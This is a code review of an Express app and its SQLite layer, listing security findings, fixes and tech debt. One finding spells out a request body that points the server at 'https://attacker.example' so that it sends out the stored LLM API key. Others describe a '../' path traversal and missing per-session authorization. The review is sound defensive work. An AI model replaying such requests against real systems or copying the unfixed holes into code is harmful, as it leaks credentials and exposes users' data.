# Code Review — `src/app.ts` + `src/db.ts` (2026-05-22)

Reviewer pass over the Express app factory and SQLite layer. Items are ordered by
severity. Status reflects the follow-up fix session on the same day.

## Security

### 1. `POST /settings/llm/models` leaked the stored LLM API key — FIXED
`app.ts` route had no PIN gate. `resolvedApiKey = apiKey?.trim() || settings.getLlmConfig().apiKey`
fell back to the **real stored key** when the caller omitted `apiKey`, then sent it as a
`Bearer` token to the caller-supplied `baseUrl`. An attacker posting
`{provider:"ollama", baseUrl:"https://attacker.example"}` received the production key.
Also a general SSRF (arbitrary server-side fetch). The `GET` variant was always safe — it
only uses the configured baseUrl.
**Fix:** admin-PIN gate added, matching the other `/settings/*` mutations.

### 2. User PINs used unsalted SHA-256 — FIXED
`/auth` stored `sha256(pin)` with a non-constant-time `!==` comparison. PINs are short, so
unsalted SHA-256 is rainbow-tableable. The admin PIN already did it right (scrypt + per-hash
salt + `timingSafeEqual`).
**Fix:** user PINs now hash with scrypt via the existing `hashPin`/`verifyPin`. Login detects
legacy unsalted hashes (no `:` separator), verifies them, and transparently re-hashes on
success — no forced password reset.

### 3. No per-session authorization — SKIPPED (by decision)
`/session/:id/*` routes verify the session exists and `userId` is valid, but never that the
user is associated with the session. Any logged-in user can drive/read any session by ID.
Left as-is intentionally: the collaborative `/listen` mirror and the transparency principle
assume open multi-user visibility. Internal tool, low risk.

### 4. `bugId` flows into a directory name unsanitized — NOT ADDRESSED
`POST /session` and `/session/adhoc` pass user-controlled `bugId` to
`getOrCreateWorkspace(bugId)` → `path.join(WORKSPACES_ROOT, bugId)`. A `bugId` containing
`../` could escape `DATA_DIR`. Not in scope for this pass; worth a follow-up — sanitize the
id before it becomes a path segment.

## Tech debt

### Unbounded growth — FIXED (opt-in)
Sessions, messages, and disk workspaces never expired. New `src/services/retention.ts`
sweeps sessions older than `SESSION_RETENTION_DAYS`, deleting their messages and workspace
dirs. Default `0` = disabled (the sweep is destructive — opt-in only). Runs on startup and
every 24h when enabled.

### No concurrency guard on `/analyze` — FIXED
Two concurrent analyses on one session both ran and both wrote `cline_session_id`; `abort`
then acted on whichever wrote last. An in-memory `Set<sessionId>` now rejects a second
in-flight analysis with 409. Covers both `/analyze` and `/lucky` (same session, same agent).

### `messages.buildSummary` unbounded — FIXED
Joined every message in the session for wiki synthesis. Now capped at the last 40 turns,
4000 chars/msg — parity with the CLI history cap.

### `/skills` cache never expired — FIXED
`skillsCache` was invalidated only on `PUT /settings/skills`, not on disk edits, contradicting
the documented "30s TTL so live edits take effect" principle. Now has a 30s TTL.

## Smaller notes (not actioned)

- `db.ts` migrations are `try { ALTER TABLE } catch {}` — swallow *all* errors, not just
  "column exists". A real migration failure (lock, disk, syntax) is invisible.
- No indexes on `messages.session_id` or `sessions(bug_id, status)` — full scans. Cheap to add.
- `/analyze` calls `res.end()` in the `done`/`error` branches without `break`ing the loop;
  events yielded after `done` would write to a closed stream. `/lucky` does it right.
- Redundant `const fs = await import("fs/promises")` inside `GET /session/:id` — `fs` is
  already imported at module scope.
- `as any` row casts throughout `db.ts` — acceptable for `node:sqlite`, but `messages.list`
  casts `as unknown as Message[]` so `role` is unvalidated.

## Positives

- `DispatchingAgentRunner` packs the owning engine into the session ID instead of adding a
  DB column — follow-ups self-route. Clean.
- SSE `else`-branch emits unknown agent events as status lines — matches the transparency
  principle, degrades gracefully.
- Path-traversal guards (`resolveWorkspaceFilePath`, 403 on escape) are consistently applied
  across file routes — the one gap is the `bugId`→path case (#4).
- Engine-switch and model-switch session resets are lazy/per-session rather than eager.
